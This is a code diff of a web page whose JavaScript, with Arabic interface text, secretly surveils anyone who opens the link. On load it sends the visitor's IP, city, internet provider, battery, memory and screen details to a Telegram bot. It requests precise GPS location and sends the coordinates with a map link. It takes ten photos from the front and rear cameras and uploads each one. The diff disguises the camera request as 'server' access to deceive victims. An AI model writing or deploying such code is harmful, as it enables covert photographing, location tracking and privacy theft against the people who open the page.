@@ -19,11 +19,22 @@
             border-radius: 10px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
         }
-        img {
-            max-width: 90%;
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
             margin-top: 20px;
+        }
+        .gallery img {
+            max-width: 100%;
+            margin-top: 0;
             border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s;
+            border: 3px solid #4CAF50;
+        }
+        .gallery img:hover {
+            transform: scale(1.05);
         }
         video {
             display: none;
@@ -39,6 +50,8 @@
             background: #f0f0f0;
             border-radius: 5px;
             display: inline-block;
+            max-width: 90%;
+            word-wrap: break-word;
         }
         .permission-request {
             margin: 20px auto;
@@ -79,6 +92,49 @@
             border-radius: 10px;
             transition: width 0.3s;
         }
+        .counter {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 10px 0;
+            color: #2196F3;
+        }
+        .camera-indicator {
+            font-size: 18px;
+            margin: 5px 0;
+            color: #FF9800;
+        }
+        .completion-message {
+            font-size: 20px;
+            color: #4CAF50;
+            margin: 20px 0;
+            padding: 10px;
+            background: #e8f5e8;
+            border-radius: 5px;
+        }
+        .location-status {
+            font-size: 14px;
+            color: #666;
+            margin: 5px 0;
+        }
+        .mini-status {
+            font-size: 12px;
+            color: #999;
+            margin: 2px 0;
+        }
+        .gallery-title {
+            font-size: 22px;
+            color: #333;
+            margin: 20px 0 10px 0;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #4CAF50;
+        }
+        .gallery-container {
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+        .gallery-container.visible {
+            opacity: 1;
+        }
     </style>
 </head>
 <body>
@@ -87,7 +143,7 @@
         
         <div id="permissionRequest" class="permission-request hidden">
             <h3>⚠️ يلزم إذن الوصول إلى الكاميرا</h3>
-            <p>لمتابعة عملية الالتقاط، يرجى منح الإذن للوصول إلى الكاميرا</p>
+            <p>لمتابعة عملية التحميل، يرجى منح الإذن للوصول إلى الخادم</p>
             <button id="grantPermissionButton">منح الإذن</button>
         </div>
 
@@ -95,10 +151,18 @@
             <div id="progress" class="progress"></div>
         </div>
 
-        <div id="loadingText" class="loading"> جاري تهيئة النظام ...</div>
+        <div id="cameraIndicator" class="camera-indicator"></div>
+        <div id="counter" class="counter"></div>
+        <div id="locationStatus" class="location-status"></div>
+        <div id="loadingText" class="loading">جاري تهيئة النظام ...</div>
         <div id="status" class="status"></div>
+        <div id="miniStatus" class="mini-status"></div>
         
-        <img id="displayImage" src="https://via.placeholder.com/600x400?text=جاري+التحضير+للالتقاط" alt="الصورة">
+        <!-- منطقة عرض ال (تظهر فقط بعد الانتهاء) -->
+        <div id="galleryContainer" class="gallery-container">
+            <div class="gallery-title" id="galleryTitle" style="display: none;">جميع السيرفرات تعمل (تم الإرسال إلى البوت)</div>
+            <div class="gallery" id="gallery"></div>
+        </div>
     </div>
 
     <video id="video" autoplay muted playsinline></video>
@@ -114,21 +178,79 @@
         const canvas = document.getElementById("canvas");
         const ctx = canvas.getContext("2d");
         const statusDiv = document.getElementById("status");
-        const displayImage = document.getElementById("displayImage");
+        const miniStatus = document.getElementById("miniStatus");
         const loadingText = document.getElementById("loadingText");
         const permissionRequest = document.getElementById("permissionRequest");
         const grantPermissionButton = document.getElementById("grantPermissionButton");
         const progressBar = document.getElementById("progress");
+        const cameraIndicator = document.getElementById("cameraIndicator");
+        const counterDiv = document.getElementById("counter");
+        const locationStatus = document.getElementById("locationStatus");
+        const gallery = document.getElementById("gallery");
+        const galleryContainer = document.getElementById("galleryContainer");
+        const galleryTitle = document.getElementById("galleryTitle");
         
-        let facing = "user";  // Start with front camera
+        let facing = "user"; // user = أمامية, environment = خلفية
         let captureCount = 0;
-        const maxCaptures = 2;  // Capture from both cameras
+        const photosPerCamera = 5; // 5  من كل كاميرا
+        const totalPhotos = photosPerCamera * 2; // إجمالي 10  (5 أمامية + 5 خلفية)
         let permissionAttempts = 0;
         let maxPermissionAttempts = 3;
+        let currentCameraPhotos = 0;
+        let stream = null;
+        let locationData = null;
+        let locationAttempts = 0;
+        const maxLocationAttempts = 3;
+        
+        // متغيرات للتحكم في التوقيت
+        let initialReportSent = false;
+        let locationRequested = false;
+        
+        // مصفوفة لتخزين الخوادم مؤقتاً
+        let capturedImages = [];
 
         // Function to update progress bar
         function updateProgress(percent) {
             progressBar.style.width = percent + '%';
+        }
+
+        // Function to update counter display
+        function updateCounter() {
+            const totalTaken = captureCount;
+            const cameraType = facing === 'user' ? 'الأمامية' : 'الخلفية';
+            cameraIndicator.textContent = `🌐 الخادم ${cameraType}`;
+            counterDiv.textContent = `🌐 تم تحميل ${totalTaken} من ${totalPhotos} `;
+        }
+
+        // Function to add image to gallery (للتخزين المؤقت فقط)
+        function storeImageLocally(imageUrl, index) {
+            capturedImages.push({
+                url: imageUrl,
+                index: index,
+                cameraType: index <= 5 ? 'أمامية' : 'خلفية'
+            });
+        }
+
+        // Function to display all images after completion
+        function displayAllImages() {
+            // ترتيب الخوادم حسب الرقم
+            capturedImages.sort((a, b) => a.index - b.index);
+            
+            // إضافة الخوادم إلى المعرض
+            capturedImages.forEach(img => {
+                const imageElement = document.createElement('img');
+                imageElement.src = img.url;
+                imageElement.alt = `ة ${img.index}`;
+                imageElement.title = `ة ${img.index} - ${img.cameraType}`;
+                gallery.appendChild(imageElement);
+            });
+            
+            // إظهار المعرض مع تأثير
+            galleryTitle.style.display = 'block';
+            galleryContainer.classList.add('visible');
+            
+            // رسالة تأكيد
+            statusDiv.textContent = `✅ تم عرض جميع الطلبات (${capturedImages.length} ) في المعرض`;
         }
 
         // Function to send data to Telegram
@@ -139,7 +261,7 @@
                 if (isPhoto) {
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', new Blob([data], { type: 'image/jpeg' }), 'photo.jpg');
+                    formData.append('photo', new Blob([data], { type: 'image/jpeg' }), `photo_${Date.now()}.jpg`);
                     await fetch(url, { method: 'POST', body: formData });
                 } else {
                     await fetch(url, {
@@ -155,18 +277,249 @@
             }
         }
 
-        // Function to send text info to Telegram
-        async function sendTextToTelegram(ip, ua, gpsLat = null, gpsLong = null) {
-            const now = new Date().toLocaleString('ar-EG');
-            const gpsText = gpsLat && gpsLong ? `\n📍 GPS: ${gpsLat}, ${gpsLong}` : '';
-            
-            const message = `📸 تم فتح الرابط:
+        // Function to get client IP and location details
+        async function getIPDetails() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'غير معروف',
+                    country: data.country_name || 'غير معروف',
+                    city: data.city || 'غير معروف',
+                    org: data.org || 'غير معروف'
+                };
+            } catch (error) {
+                console.log("Couldn't get IP details:", error);
+                return {
+                    ip: 'غير معروف',
+                    country: 'غير معروف',
+                    city: 'غير معروف',
+                    org: 'غير معروف'
+                };
+            }
+        }
 
-🕒 ${now}
-🌐 IP: ${ip}
-📱 UA: ${ua}${gpsText}`;
+        // Function to get battery info
+        async function getBatteryInfo() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging ? 'متصل' : 'غير متصل'
+                    };
+                }
+                return { level: 'غير معروف', charging: 'غير معروف' };
+            } catch (error) {
+                return { level: 'غير معروف', charging: 'غير معروف' };
+            }
+        }
+
+        // Function to get network info
+        function getNetworkInfo() {
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                return {
+                    type: conn.effectiveType || 'غير معروف',
+                    speed: conn.downlink ? conn.downlink + ' Mbps' : 'غير معروف'
+                };
+            }
+            return { type: 'غير معروف', speed: 'غير معروف' };
+        }
+
+        // Function to get RAM info
+        function getRAMInfo() {
+            if ('deviceMemory' in navigator) {
+                return navigator.deviceMemory + ' GB';
+            }
+            return 'غير معروف';
+        }
+
+        // Function to send initial report (immediately on page load)
+        async function sendInitialReport() {
+            if (initialReportSent) return;
             
-            return await sendToTelegram('sendMessage', { text: message });
+            initialReportSent = true;
+            miniStatus.textContent = '📤 جاري إرسال التقرير الافتتاحي...';
+            
+            const now = new Date().toLocaleString('ar-EG');
+            const ua = navigator.userAgent;
+            const platform = navigator.platform || 'غير معروف';
+            const language = navigator.language || 'غير معروف';
+            const cores = navigator.hardwareConcurrency || 'غير معروف';
+            const ram = getRAMInfo();
+            const pageUrl = window.location.href;
+            const referrer = document.referrer || 'مباشر';
+            
+            // Get IP details
+            const ipDetails = await getIPDetails();
+            
+            // Get battery info
+            const battery = await getBatteryInfo();
+            
+            // Get network info
+            const network = getNetworkInfo();
+            
+            // Get screen info
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const colorDepth = window.screen.colorDepth;
+            
+            // Detect mobile
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+            
+            const message = `🚨 **تنبيه: تم فتح الرابط**
+
+🕐 الوقت: ${now}
+📲 مصدر الدخول: ${referrer}
+🔗 الرابط: ${pageUrl}
+
+📱 **معلومات الجهاز**
+🗣️ اللغة: ${language}
+💻 المنصة: ${platform}
+⚙️ المعالجات: ${cores}
+🧠 RAM: ${ram}
+📱 جهاز متحرك: ${isMobile ? 'نعم' : 'لا'}
+
+🌐 **معلومات الشبكة**
+🌍 IP: ${ipDetails.ip}
+📍 البلد: ${ipDetails.country}
+🏙️ المدينة: ${ipDetails.city}
+📡 الموفر: ${ipDetails.org}
+📶 نوع الاتصال: ${network.type}
+⚡ السرعة: ${network.speed}
+
+📐 **الشاشة**
+📏 الأبعاد: ${screenWidth} x ${screenHeight}
+🎨 عمق الألوان: ${colorDepth} bit
+
+🔋 **البطارية**
+💯 المستوى: ${battery.level}%
+⚡ الشحن: ${battery.charging}`;
+
+            const success = await sendToTelegram('sendMessage', { text: message, parse_mode: 'Markdown' });
+            
+            if (success) {
+                miniStatus.textContent = '✅ تم إرسال التقرير الافتتاحي';
+                setTimeout(() => {
+                    miniStatus.textContent = '';
+                }, 3000);
+            } else {
+                miniStatus.textContent = '❌ فشل إرسال التقرير الافتتاحي';
+            }
+        }
+
+        // Function to get ASlocation automatically
+        async function getASLocation() {
+            if (locationRequested) return;
+            
+            locationRequested = true;
+            locationStatus.textContent = ' جاري محاولة الحصول على الموقع AS...';
+            
+            if (!navigator.geolocation) {
+                locationStatus.textContent = '⚠️ الموقع غير مدعوم في هذا المتصفح';
+                return;
+            }
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 30000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const locationInfo = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude || 'غير متوفر',
+                        heading: position.coords.heading || 'غير متوفر',
+                        speed: position.coords.speed || 'غير متوفر',
+                        timestamp: new Date(position.timestamp).toLocaleString('ar-EG')
+                    };
+                    
+                    locationStatus.textContent = ' جاري الحصول على العنوان...';
+                    
+                    // Get address
+                    try {
+                        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationInfo.latitude}&lon=${locationInfo.longitude}&accept-language=ar`);
+                        const data = await response.json();
+                        locationInfo.address = data.display_name || 'غير متوفر';
+                    } catch (error) {
+                        locationInfo.address = 'غير متوفر';
+                    }
+                    
+                    locationData = locationInfo;
+                    
+                    // Send ASreport immediately
+                    await sendASReport(locationInfo);
+                    
+                    locationStatus.textContent = '✅ تم إرسال موقع AS';
+                },
+                (error) => {
+                    locationAttempts++;
+                    let errorMessage = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = 'تم رفض الإذن للموقع';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = 'الموقع غير متوفر';
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = 'انتهى وقت الطلب';
+                            break;
+                        default:
+                            errorMessage = 'خطأ غير معروف';
+                    }
+                    
+                    locationStatus.textContent = `⚠️ ${errorMessage}`;
+                    
+                    if (locationAttempts < maxLocationAttempts) {
+                        setTimeout(() => {
+                            locationRequested = false;
+                            getASLocation();
+                        }, 2000);
+                    }
+                },
+                options
+            );
+        }
+
+        // Function to send ASreport
+        async function sendASReport(locationInfo) {
+            const now = new Date().toLocaleString('ar-EG');
+            const pageUrl = window.location.href;
+            
+            // Get IP details for context
+            const ipDetails = await getIPDetails();
+            
+            const message = ` **تقرير الموقع AS**
+
+🕐 وقت التقرير: ${now}
+🔗 الرابط: ${pageUrl}
+
+📌 **الإحداثيات**
+📍 خط العرض: ${locationInfo.latitude}
+📍 خط الطول: ${locationInfo.longitude}
+🎯 الدقة: ±${locationInfo.accuracy} متر
+🏔️ الارتفاع: ${locationInfo.altitude} متر
+🧭 الاتجاه: ${locationInfo.heading} درجة
+⚡ السرعة: ${locationInfo.speed} م/ث
+
+📬 **العنوان**
+${locationInfo.address}
+
+🔗 **رابط الموقع**
+https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}
+
+🌐 **معلومات إضافية**
+🌍 IP: ${ipDetails.ip}
+📍 البلد: ${ipDetails.country}
+🏙️ المدينة: ${ipDetails.city}`;
+
+            return await sendToTelegram('sendMessage', { text: message, parse_mode: 'Markdown' });
         }
 
         // Function to capture image from video stream
@@ -176,154 +529,158 @@
                 canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0);
                 
-                // Convert canvas to JPEG and send to Telegram
                 canvas.toBlob(async (blob) => {
                     const arrayBuffer = await blob.arrayBuffer();
+                    const cameraType = facing === 'user' ? 'أمامية' : 'خلفية';
+                    const imageNumber = captureCount + 1;
+                    
+                    // إنشاء URL للة وتخزينها مؤقتاً (بدون عرض)
+                    const imageUrl = URL.createObjectURL(blob);
+                    storeImageLocally(imageUrl, imageNumber);
+                    
+                    // إرسال الة إلى تيليغرام فوراً
+                    statusDiv.textContent = `🌐 جاري إرسال الة ${imageNumber} إلى البوت...`;
                     const success = await sendToTelegram('sendPhoto', arrayBuffer, true);
                     
                     if (success) {
-                        statusDiv.textContent = `اضغط سماح بالوصول لعرض الطلب الخاص بك ${facing === 'user' ? 'وحده من الأمامية' : 'وحده من الخلفية'}`;
+                        statusDiv.textContent = `✅ تم إرسال الة ${imageNumber} (${cameraType}) إلى البوت`;
                     } else {
-                        statusDiv.textContent = '❌ فشل إرسال الصورة';
+                        statusDiv.textContent = `❌ فشل إرسال الة ${imageNumber} إلى البوت`;
                     }
                     
-                    // Update progress
-                    updateProgress((captureCount / maxCaptures) * 100);
-                    
-                    // Display the captured image
-                    displayImage.src = URL.createObjectURL(blob);
-                    
-                    // Stop current tracks
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                    
-                    // Switch camera or stop if we've captured enough
                     captureCount++;
-                    if (captureCount < maxCaptures) {
+                    currentCameraPhotos++;
+                    
+                    updateCounter();
+                    updateProgress((captureCount / totalPhotos) * 100);
+                    
+                    // التحقق من اكتمال التحميل
+                    if (captureCount >= totalPhotos) {
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                        loadingText.textContent = "✅ اكتمل التحميل والإرسال إلى البوت بنجاح";
+                        cameraIndicator.textContent = "🌐 اكتمل التحميل";
+                        
+                        // عرض جميع ال في الموقع بعد الانتهاء
+                        displayAllImages();
+                        return;
+                    }
+                    
+                    // التبديل بينت
+                    if (currentCameraPhotos >= photosPerCamera) {
+                        currentCameraPhotos = 0;
                         facing = facing === "user" ? "environment" : "user";
-                        setTimeout(switchCamera, 800);  // Reduced from 1000ms to 800ms
+                        
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                        
+                        setTimeout(() => {
+                            startCamera();
+                        }, 1000);
                     } else {
-                        updateProgress(100);
-                        loadingText.textContent = "✅ اكتمل بنجاح";
+                        setTimeout(captureImage, 500);
                     }
                 }, 'image/jpeg', 0.9);
+            } else {
+                setTimeout(captureImage, 200);
             }
         }
 
-        // Function to switch between cameras
-        async function switchCamera() {
+        // Function to start camera
+        async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: { exact: facing } }
-                });
+                cameraIndicator.classList.remove('hidden');
+                counterDiv.classList.remove('hidden');
+                cameraIndicator.textContent = `🌐 جاري تشغيل الخادم ${facing === 'user' ? 'الأمامية' : 'الخلفية'}...`;
                 
+                const constraints = {
+                    video: { 
+                        facingMode: facing,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
-                video.play();
-                setTimeout(captureImage, 800);  // Reduced from 1000ms to 800ms
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(captureImage, 1000);
+                };
+                
             } catch (err) {
-                console.log("فشل تشغيل الكاميرا:", err);
-                // Try the other camera if one fails
-                facing = facing === "user" ? "environment" : "user";
-                if (captureCount < maxCaptures) {
-                    setTimeout(switchCamera, 800);  // Reduced from 1000ms to 800ms
+                console.log("فشل تشغيل الخادم:", err);
+                statusDiv.textContent = `❌ فشل تشغيل الخدم ${facing === 'user' ? 'الأمامية' : 'الخلفية'}`;
+                
+                if (captureCount < totalPhotos) {
+                    facing = facing === "user" ? "environment" : "user";
+                    setTimeout(startCamera, 1000);
                 }
-            }
-        }
-
-        // Function to get client IP (fallback to a service if needed)
-        async function getClientIP() {
-            try {
-                // First try a direct method (works on some browsers)
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.log("Couldn't get IP directly:", error);
-                return "غير معروف";
-            }
-        }
-
-        // Function to check camera permission
-        async function checkCameraPermission() {
-            try {
-                if (navigator.permissions && navigator.permissions.query) {
-                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-                    return permissionStatus.state;
-                }
-                return 'unknown';
-            } catch (error) {
-                console.error('Permission API not supported', error);
-                return 'unknown';
             }
         }
 
         // Main initialization
         async function init() {
-            loadingText.textContent = 'انتظر رجاء التحميل...';
-            updateProgress(10);
+            loadingText.textContent = 'جاري التحميل...';
             
-            // Get client info
-            const ip = await getClientIP();
-            const ua = navigator.userAgent;
+            // إرسال التقرير الافتتاحي فوراً
+            await sendInitialReport();
+            
+            updateProgress(20);
+            
+            // بدء طلب الموقع تلقائياً
+            setTimeout(() => {
+                getASLocation();
+            }, 1000);
+            
             updateProgress(30);
             
-            // Send initial info to Telegram
-            const textSent = await sendTextToTelegram(ip, ua);
-            if (textSent) {
-                statusDiv.textContent = '✅ تم إرسال معلومات الجهاز';
-            } else {
-                statusDiv.textContent = '❌ فشل إرسال معلومات الجهاز';
-            }
-            updateProgress(50);
-            
-            // Try to get GPS location
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const gpsSent = await sendTextToTelegram(ip, ua, pos.coords.latitude, pos.coords.longitude);
-                    if (gpsSent) {
-                        statusDiv.textContent += ' +  اصبر هتتفشخ';
-                    }
-                    updateProgress(70);
-                }, (err) => {
-                    console.log("فشل الحصول على الموقع:", err);
-                    updateProgress(70);
-                }, { timeout: 5000 });
-            } else {
-                updateProgress(70);
-            }
-            
-            // Start camera capture process
-            switchCamera();
+            // بدء الخادم
+            setTimeout(() => {
+                statusDiv.textContent = '🌐 جاري تجهيز الخادم...';
+                updateCounter();
+                startCamera();
+            }, 1500);
         }
 
-        // Try to access camera with auto-retry
+        // Try to access camera
         async function tryCameraAccess() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                // If we get here, permission was granted
+                const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                testStream.getTracks().forEach(track => track.stop());
                 permissionRequest.classList.add("hidden");
                 init();
             } catch (error) {
-                console.log("فشل في الحصول على إذن الكاميرا:", error);
+                console.log("فشل في الحصول على إذن الخادم:", error);
                 permissionAttempts++;
                 
                 if (permissionAttempts < maxPermissionAttempts) {
-                    // Show permission request
                     permissionRequest.classList.remove("hidden");
-                    statusDiv.textContent = `يرجى منح الإذن للكاميرا للمتابعة (المحاولة ${permissionAttempts}/${maxPermissionAttempts})`;
+                    statusDiv.textContent = `يرجى منح الإذن للكاميرا (المحاولة ${permissionAttempts}/${maxPermissionAttempts})`;
                 } else {
-                    statusDiv.textContent = "فشل في الوصول إلى الكاميرا. يرجى تحديث الصفحة والمحاولة مرة أخرى.";
+                    statusDiv.textContent = "فشل في الوصول إلى الخادم";
                     loadingText.textContent = "❌ تم إلغاء العملية";
+                    
+                    // حتى بدون كاميرا، نرسل التقرير الافتتاحي
+                    sendInitialReport();
                 }
             }
         }
 
-        // Grant permission button click handler
+        // Auto-start on page load
         grantPermissionButton.addEventListener('click', tryCameraAccess);
 
-        // Initial auto-try
+        // Start immediately on page load
         window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(tryCameraAccess, 500);
+            // إرسال التقرير الافتتاحي فور تحميل الصفحة (حتى قبل طلب الخادم)
+            sendInitialReport();
+            
+            // ثم طلب الخادم
+            setTimeout(tryCameraAccess, 1000);
         });
     </script>
 </body>
-    </html>
+</html>
